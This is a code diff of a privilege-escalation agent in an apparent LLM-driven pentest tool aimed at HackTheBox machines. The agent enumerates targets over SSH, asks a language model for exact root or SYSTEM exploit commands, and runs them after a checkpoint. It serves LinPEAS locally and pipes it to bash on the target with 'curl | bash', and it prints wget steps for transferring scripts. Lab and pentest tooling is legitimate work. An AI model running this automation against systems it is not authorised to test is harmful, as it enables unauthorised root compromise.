@@ -1,9 +1,12 @@
 """PrivEsc Agent — enumerate and exploit privilege escalation vectors."""
 from __future__ import annotations
+import os
 import re
+import threading
+import urllib.request
 from pathlib import Path
 from models import HackSession, AgentResult, Stage, Finding, Severity
-from tools.runner import run
+from tools.runner import run, run_parallel
 from agents.base import BaseAgent
 import checkpoint as cp
 
@@ -42,17 +45,24 @@ WINDOWS_ENUM: list[tuple[str, str]] = [
     ("creds",     "cmdkey /list 2>nul"),
 ]
 
+LINPEAS_LOCAL_PATHS = [
+    "/usr/share/peass/linpeas.sh",
+    str(Path.home() / ".local/share/atlas/linpeas.sh"),
+    "/opt/linpeas.sh",
+    "/usr/share/linpeas/linpeas.sh",
+]
+LINPEAS_CACHE = Path.home() / ".local/share/atlas/linpeas.sh"
+LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+
 
 class PrivEscAgent(BaseAgent):
     NAME  = "PrivEsc"
     STAGE = Stage.PRIVESC
 
     SYSTEM_PROMPT = """You are an expert penetration tester specialising in privilege escalation.
-You have deep knowledge of Linux privesc: SUID binaries (GTFOBins), sudo misconfigs, capabilities,
-cron job hijacking, writable PATH entries, kernel exploits, Docker/LXD group abuse.
-And Windows privesc: token impersonation, unquoted service paths, AlwaysInstallElevated,
-scheduled tasks, unattended install files, credential files.
-You are part of ATLAS. Be precise. Give exact commands. Reference GTFOBins where applicable.
+Linux: SUID (GTFOBins), sudo misconfigs, capabilities, cron hijack, writable PATH, kernel exploits, Docker/LXD.
+Windows: token impersonation, unquoted service paths, AlwaysInstallElevated, scheduled tasks, unattended files, credential files.
+Part of ATLAS. Give exact commands. Reference GTFOBins by name where applicable.
 Never fabricate CVEs or binary names."""
 
     def run(self) -> AgentResult:
@@ -64,7 +74,7 @@ Never fabricate CVEs or binary names."""
 
         if ssh_cred:
             self.log(f"SSH access: {ssh_cred.username}@{ip}", "success")
-            enum_data = self._run_via_ssh(ip, ssh_cred, is_windows, result)
+            enum_data = self._run_via_ssh_parallel(ip, ssh_cred, is_windows, result)
         else:
             self.log("No SSH creds — generating script for manual execution", "warning")
             enum_data = self._generate_script_mode(ip, is_windows, result)
@@ -75,8 +85,9 @@ Never fabricate CVEs or binary names."""
 
         # ── LLM analysis ─────────────────────────────────────────
         self.log("LLM analysing privesc surface...")
-        analysis = self.ask_json(f"""
-Analyse this privilege escalation enumeration from a {'Windows' if is_windows else 'Linux'} HTB machine.
+        try:
+            analysis = self.ask_json(f"""
+Analyse privilege escalation enumeration for a {'Windows' if is_windows else 'Linux'} HTB machine.
 
 SESSION:
 {self.session.context_summary()}
@@ -84,38 +95,40 @@ SESSION:
 ENUMERATION OUTPUT:
 {enum_data[:6000]}
 
-Respond with JSON:
+Respond ONLY with valid JSON:
 {{
   "current_user": "username",
-  "current_groups": ["group1", "group2"],
+  "current_groups": ["group1"],
   "kernel_version": "X.X.X",
-  "kernel_exploits": ["CVE-XXXX-XXXX description if applicable"],
+  "kernel_exploits": ["CVE-XXXX-XXXX if kernel is vulnerable"],
   "vectors": [
     {{
       "rank": 1,
-      "type": "SUID|sudo|cron|capability|writable|kernel|docker|service|token|etc",
-      "target": "specific binary, file, or service",
+      "type": "SUID | sudo | cron | capability | writable | kernel | docker | service | token",
+      "target": "specific binary or file",
       "description": "what the misconfiguration is",
       "exploit_command": "exact command to achieve root/SYSTEM",
-      "gtfobins_ref": "gtfobins.github.io/gtfobins/NAME or null",
-      "confidence": "high|medium|low",
-      "why": "why this will work"
+      "gtfobins_ref": "URL or null",
+      "confidence": "high | medium | low",
+      "why": "why this works"
     }}
   ],
   "interesting_files": ["files with passwords or keys worth reading"],
-  "key_finding": "most important single finding in one sentence",
+  "key_finding": "most important single finding",
   "linpeas_recommended": true
 }}""")
+        except RuntimeError as e:
+            self.log(f"PrivEsc LLM failed: {e}", "warning")
+            result.summary = "PrivEsc LLM analysis failed. Raw enum saved."
+            return result
 
         vectors = analysis.get("vectors", [])
-
-        # ── Display ───────────────────────────────────────────────
         self._print_analysis(analysis, vectors)
 
         result.next_actions = [v.get("exploit_command", "") for v in vectors if v.get("exploit_command")]
         result.metadata = analysis
 
-        # ── LinPEAS (optional) ────────────────────────────────────
+        # ── LinPEAS (optional — served from local HTTP) ───────────
         if analysis.get("linpeas_recommended") and ssh_cred and not is_windows:
             self._maybe_run_linpeas(ip, ssh_cred, result)
 
@@ -130,11 +143,10 @@ Respond with JSON:
                     what_found=f"{v.get('type')} via {v.get('target')} [{v.get('confidence','?').upper()}]",
                     plan=f"Execute: {cmd}",
                     why=v.get("why", ""),
-                    what_to_look_for="uid=0, root shell prompt, /root/root.txt content",
+                    what_to_look_for="uid=0(root) in output, root flag content",
                     command=cmd,
                     risk="high",
                 )
-
                 if cr.action == cp.CheckpointResult.ABORTED:
                     break
                 if not cr.approved:
@@ -146,27 +158,25 @@ Respond with JSON:
 
                 if self._is_root(out):
                     self.log("ROOT/SYSTEM ACHIEVED!", "success")
-                    self._capture_root_flag(ip, ssh_cred, run_cmd, result)
+                    self._capture_root_flag(ip, ssh_cred, result)
                     result.findings.append(Finding(
                         title=f"Privilege Escalation: {v.get('type')}",
                         severity=Severity.CRITICAL,
-                        description=f"Escalated to root via {v.get('target')}. {v.get('why', '')}",
+                        description=f"Escalated via {v.get('target')}. {v.get('why', '')}",
                         evidence=out[:400],
                         command=run_cmd,
                         agent=self.NAME,
                     ))
                     break
 
-                # LLM interprets output
                 interp = self.ask(
                     f"PrivEsc attempt:\nCommand: {run_cmd}\nOutput:\n{out[:1500]}\n\n"
-                    "Did this succeed? What does the output mean? "
-                    "Any partial access gained? What to try next?"
+                    "Did this succeed? What does the output mean? What to try next?"
                 )
                 cp.notify("PrivEsc", interp[:250], "info")
 
         result.summary = (
-            f"PrivEsc complete. {len(vectors)} vector(s). "
+            f"PrivEsc: {len(vectors)} vector(s). "
             f"Root: {'CAPTURED — ' + self.session.root_flag if self.session.root_flag else 'not captured'}"
         )
         return result
@@ -174,93 +184,96 @@ Respond with JSON:
     # ── SSH helpers ───────────────────────────────────────────────
 
     def _find_ssh_cred(self):
-        """Find best SSH credential from session."""
-        # Prefer creds tagged as ssh
         for c in self.session.credentials:
             if c.service == "ssh" and c.username and c.password:
                 return c
-        # Fall back to any cred with username+password
         for c in self.session.credentials:
             if c.username and c.password:
                 return c
         return None
 
-    def _ssh_run_cmd(self, ip: str, cred, command: str, timeout: int = 30) -> str:
-        """Run a command on target via SSH. Returns combined stdout+stderr."""
+    def _build_ssh_cmd(self, ip: str, cred, command: str) -> str:
         ssh_port = self.session.ssh_port
         port_flag = f"-p {ssh_port.number}" if ssh_port and ssh_port.number != 22 else ""
-        # Use sshpass for password auth; fall back to key auth
         if cred.password:
-            ssh_cmd = (
+            return (
                 f"sshpass -p {cred.password!r} ssh "
-                f"-o StrictHostKeyChecking=no -o BatchMode=no "
-                f"-o ConnectTimeout=10 {port_flag} "
-                f"{cred.username}@{ip} {command!r}"
+                f"-o StrictHostKeyChecking=no -o BatchMode=no -o ConnectTimeout=10 "
+                f"{port_flag} {cred.username}@{ip} {command!r}"
             )
-        else:
-            ssh_cmd = (
-                f"ssh -o StrictHostKeyChecking=no -o BatchMode=yes "
-                f"-o ConnectTimeout=10 {port_flag} "
-                f"{cred.username}@{ip} {command!r}"
-            )
-        r = run(ssh_cmd, timeout=timeout, log_dir=self.output_dir)
+        return (
+            f"ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=10 "
+            f"{port_flag} {cred.username}@{ip} {command!r}"
+        )
+
+    def _ssh_run_cmd(self, ip: str, cred, command: str, timeout: int = 30) -> str:
+        r = run(self._build_ssh_cmd(ip, cred, command), timeout=timeout, log_dir=self.output_dir)
         return r.output
 
-    def _run_via_ssh(self, ip: str, cred, is_windows: bool, result: AgentResult) -> str:
-        """Run all enum commands via SSH, return combined output."""
+    def _run_via_ssh_parallel(self, ip: str, cred, is_windows: bool, result: AgentResult) -> str:
+        """Run all enum commands in parallel via SSH."""
         enum_cmds = WINDOWS_ENUM if is_windows else LINUX_ENUM
 
         cr = self.checkpoint(
             what_found=f"SSH access as {cred.username}@{ip} (OS: {'Windows' if is_windows else 'Linux'})",
-            plan=f"Run {len(enum_cmds)} post-shell enumeration commands",
-            why="Automated privesc enum covers SUID, sudo, caps, cron, writable paths, kernel — same checklist a human pentester runs. Parallel SSH for speed.",
-            what_to_look_for="SUID on unusual binary, sudo NOPASSWD, writable cron, cap_setuid, docker group, shadow readable",
-            command=f"[{len(enum_cmds)} SSH commands as {cred.username}]",
+            plan=f"Run {len(enum_cmds)} enum commands via SSH in parallel",
+            why="Automated enum covers SUID, sudo, caps, cron, writable paths, kernel — parallel SSH is 4-5x faster than sequential.",
+            what_to_look_for="SUID on unusual binary, sudo NOPASSWD, writable cron, cap_setuid, docker group, readable shadow",
+            command=f"[{len(enum_cmds)} SSH commands as {cred.username} — parallel]",
             risk="low",
         )
         if not cr.approved:
             return ""
 
+        tasks = [
+            {
+                "name": name,
+                "command": self._build_ssh_cmd(ip, cred, cmd),
+                "timeout": 25,
+                "log_dir": self.output_dir,
+            }
+            for name, cmd in enum_cmds
+        ]
+
+        self.log(f"Running {len(tasks)} enum commands in parallel...")
+        parallel_results = run_parallel(tasks, max_workers=min(10, len(tasks)))
+
         outputs: list[str] = []
-        for name, cmd in enum_cmds:
-            self.log(f"  enum: {name}...")
-            out = self._ssh_run_cmd(ip, cred, cmd, timeout=20)
-            if out:
-                outputs.append(f"=== {name.upper()} ===\n{out}")
-                result.raw_outputs[f"privesc_enum_{name}"] = out
-                cp.tool_output(f"ssh/{name}", out[:150] if len(out) > 150 else out)
+        for name, _ in enum_cmds:
+            r = parallel_results.get(name)
+            if r and r.output.strip():
+                outputs.append(f"=== {name.upper()} ===\n{r.output}")
+                result.raw_outputs[f"privesc_enum_{name}"] = r.output
+                cp.tool_output(f"ssh/{name}", r.output[:120] if len(r.output) > 120 else r.output)
 
         return "\n\n".join(outputs)
 
     # ── Script generation (no-SSH fallback) ──────────────────────
 
     def _generate_script_mode(self, ip: str, is_windows: bool, result: AgentResult) -> str:
-        """Generate enum script for manual transfer + execution."""
         enum_cmds = WINDOWS_ENUM if is_windows else LINUX_ENUM
-
         if is_windows:
             lines = ["@echo off", "REM ATLAS PrivEsc Enum"]
-            lines += [f'echo === {n.upper()} ===\r\n{c}\r\n' for n, c in enum_cmds]
-            script = "\r\n".join(lines)
-            script_name = "atlas_privesc.bat"
+            lines += [f"echo === {n.upper()} ===\r\n{c}\r\n" for n, c in enum_cmds]
+            script, fname = "\r\n".join(lines), "atlas_privesc.bat"
         else:
             lines = ["#!/bin/bash", "# ATLAS PrivEsc Enum"]
             lines += [f'echo "=== {n.upper()} ==="\n{c}' for n, c in enum_cmds]
-            script = "\n\n".join(lines)
-            script_name = "atlas_privesc.sh"
+            script, fname = "\n\n".join(lines), "atlas_privesc.sh"
 
-        script_path = Path(self.output_dir) / script_name
+        script_path = Path(self.output_dir) / fname
         script_path.write_text(script)
 
+        our_ip = self.get_tun_ip() or "YOUR_ATTACK_IP"
         from rich.console import Console
         from rich.panel import Panel
         Console().print(Panel(
             f"[bold yellow]No SSH creds — manual execution required.[/bold yellow]\n\n"
             f"Script saved: [green]{script_path}[/green]\n\n"
             f"[bold]Steps:[/bold]\n"
-            f"  1. python3 -m http.server 8000   [dim](on your machine)[/dim]\n"
-            f"  2. On target: wget http://YOUR_IP:8000/{script_name}\n"
-            f"  3. {'bash' if not is_windows else ''} {script_name} > /tmp/pe.txt 2>&1\n"
+            f"  1. python3 -m http.server 8000   [dim](in {script_path.parent})[/dim]\n"
+            f"  2. On target: wget http://{our_ip}:8000/{fname}\n"
+            f"  3. {'bash' if not is_windows else ''} {fname} > /tmp/pe.txt 2>&1\n"
             f"  4. cat /tmp/pe.txt\n\n"
             f"Paste the output below, then type [bold]END[/bold] on its own line.",
             title="[yellow]Manual PrivEsc Enum[/yellow]",
@@ -276,52 +289,94 @@ Respond with JSON:
                 lines_in.append(line)
             except (EOFError, KeyboardInterrupt):
                 break
-
         return "\n".join(lines_in) if lines_in else ""
 
-    # ── LinPEAS ───────────────────────────────────────────────────
+    # ── LinPEAS via local HTTP server ─────────────────────────────
 
     def _maybe_run_linpeas(self, ip: str, cred, result: AgentResult) -> None:
-        cr = self.checkpoint(
+        """Serve LinPEAS from local HTTP server — never rely on target internet access."""
+        import http.server
+        import socketserver
+
+        # Locate or download LinPEAS locally
+        linpeas_path: Path | None = None
+        for p in LINPEAS_LOCAL_PATHS:
+            if Path(p).exists():
+                linpeas_path = Path(p)
+                break
+
+        if not linpeas_path:
+            self.log("LinPEAS not found locally — downloading once to local cache...")
+            LINPEAS_CACHE.parent.mkdir(parents=True, exist_ok=True)
+            try:
+                urllib.request.urlretrieve(LINPEAS_URL, LINPEAS_CACHE)
+                linpeas_path = LINPEAS_CACHE
+                self.log(f"LinPEAS cached at {LINPEAS_CACHE}", "success")
+            except Exception as e:
+                self.log(f"LinPEAS download failed: {e} — skipping", "warning")
+                return
+
+        our_ip = self.get_tun_ip()
+        if not our_ip:
+            self.log("No tun interface — can't serve LinPEAS. Skipping.", "warning")
+            return
+
+        port = 8888
+        cr = cp.checkpoint(
+            agent=self.NAME,
             what_found="LLM recommends deeper enumeration",
-            plan="Download and run LinPEAS on target via SSH pipe",
-            why="LinPEAS catches 200+ vectors including PATH hijack, SUID chains, passwords in files, Docker socket, LXD group, and NFS no_root_squash.",
-            what_to_look_for="Yellow/red output sections — 'Interesting SUID files', 'Sudo version vuln', 'Writable cron', 'Passwords in files'",
-            command=f"curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | ssh {cred.username}@{ip} 'bash'",
+            plan=f"Serve {linpeas_path.name} via HTTP server on {our_ip}:{port}, run on target via SSH",
+            why="LinPEAS catches 200+ vectors. Serving locally avoids needing outbound internet on the target (most HTB boxes can't reach GitHub).",
+            what_to_look_for="Yellow/red sections — SUID, sudo misconfiguration, writable cron, passwords in files, capabilities",
+            command=f"curl -sk http://{our_ip}:{port}/{linpeas_path.name} | bash",
             risk="medium",
         )
         if not cr.approved:
             return
 
-        self.log("Running LinPEAS (this takes ~2 min)...")
-        out = self._ssh_run_cmd(
-            ip, cred,
-            "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null",
-            timeout=180,
-        )
+        # Start HTTP server in daemon thread
+        serve_dir = str(linpeas_path.parent)
+        saved_dir = os.getcwd()
+        httpd = None
+        try:
+            os.chdir(serve_dir)
+            handler = http.server.SimpleHTTPRequestHandler
+            handler.log_message = lambda *a: None  # silence access logs
+            httpd = socketserver.TCPServer(("", port), handler)
+            httpd.allow_reuse_address = True
+            server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+            server_thread.start()
+            self.log(f"HTTP server on {our_ip}:{port} serving {linpeas_path.name}", "info")
+
+            self.log("Running LinPEAS via local server (~2 min)...")
+            out = self._ssh_run_cmd(
+                ip, cred,
+                f"curl -sk http://{our_ip}:{port}/{linpeas_path.name} | bash 2>/dev/null",
+                timeout=180,
+            )
+        finally:
+            if httpd:
+                httpd.shutdown()
+            os.chdir(saved_dir)
+
         if not out:
             self.log("LinPEAS returned no output", "warning")
             return
 
         result.raw_outputs["linpeas"] = out
-
         extra = self.ask(
-            f"LinPEAS output:\n{out[-4000:]}\n\n"
-            "Find any NEW privesc vectors not already covered. "
-            "List top 3 with exact exploitation commands. Focus on highlighted findings."
+            f"LinPEAS output (last 4000 chars):\n{out[-4000:]}\n\n"
+            "List top 3 NEW privesc vectors not already covered. Give exact exploitation commands."
         )
-        cp.notify("PrivEsc", f"LinPEAS extras: {extra[:300]}", "info")
+        cp.notify("PrivEsc", f"LinPEAS extras: {extra[:350]}", "info")
 
     # ── Root flag capture ─────────────────────────────────────────
 
-    def _capture_root_flag(self, ip: str, cred, shell_cmd: str, result: AgentResult) -> None:
-        """Try to read root.txt using the escalation command."""
-        # Try wrapping the shell command to read root flag
-        flag_attempts = [
-            f"cat /root/root.txt 2>/dev/null",
-            f"find / -name root.txt 2>/dev/null | head -1 | xargs cat 2>/dev/null",
-        ]
-        for attempt in flag_attempts:
+    def _capture_root_flag(self, ip: str, cred, result: AgentResult) -> None:
+        for attempt in [
+            "cat /root/root.txt 2>/dev/null",
+            "find / -name root.txt 2>/dev/null | head -1 | xargs cat 2>/dev/null",
+        ]:
             out = self._ssh_run_cmd(ip, cred, attempt, timeout=15)
             flag = self._extract_flag(out)
             if flag:
@@ -330,15 +385,19 @@ Respond with JSON:
                 return
 
     def _is_root(self, output: str) -> bool:
-        indicators = [r"uid=0\(root\)", r"^root$", r"\$ su", r"# $", r"#\s*$",
-                      r"NT AUTHORITY\\SYSTEM", r"BUILTIN\\Administrators"]
-        return any(re.search(p, output, re.M) for p in indicators)
+        """Detect root/SYSTEM in SSH batch command output. Only check actual output content."""
+        indicators = [
+            r"uid=0\(root\)",
+            r"NT AUTHORITY\\SYSTEM",
+            r"BUILTIN\\Administrators",
+        ]
+        return any(re.search(pat, output, re.M) for pat in indicators)
 
     def _extract_flag(self, output: str) -> str:
-        m = re.search(r'HTB\{[^}]+\}', output)
+        m = re.search(r"HTB\{[^}]+\}", output)
         if m:
             return m.group(0)
-        m = re.search(r'\b[0-9a-f]{32}\b', output, re.I)
+        m = re.search(r"\b[0-9a-f]{32}\b", output, re.I)
         return m.group(0) if m else ""
 
     # ── Display ───────────────────────────────────────────────────
@@ -354,15 +413,15 @@ Respond with JSON:
             f"| Groups: {', '.join(analysis.get('current_groups', []))}\n"
             f"[bold]Kernel:[/bold] {analysis.get('kernel_version', '?')}\n\n"
         )
-
         if analysis.get("kernel_exploits"):
             body += f"[bold yellow]Kernel CVEs:[/bold yellow] {', '.join(analysis['kernel_exploits'])}\n\n"
-
         body += f"[bold green]Key finding:[/bold green] {analysis.get('key_finding', 'None')}\n\n"
         body += "[bold red]Privesc vectors:[/bold red]\n"
 
         for v in vectors:
-            conf_color = {"high": "green", "medium": "yellow", "low": "dim"}.get(v.get("confidence", "low"), "white")
+            conf_color = {"high": "green", "medium": "yellow", "low": "dim"}.get(
+                v.get("confidence", "low"), "white",
+            )
             body += (
                 f"  [{conf_color}]{v.get('rank', 0)}. [{v.get('confidence', '?').upper()}] "
                 f"{v.get('type', '?')} → {v.get('target', '?')}[/{conf_color}]\n"
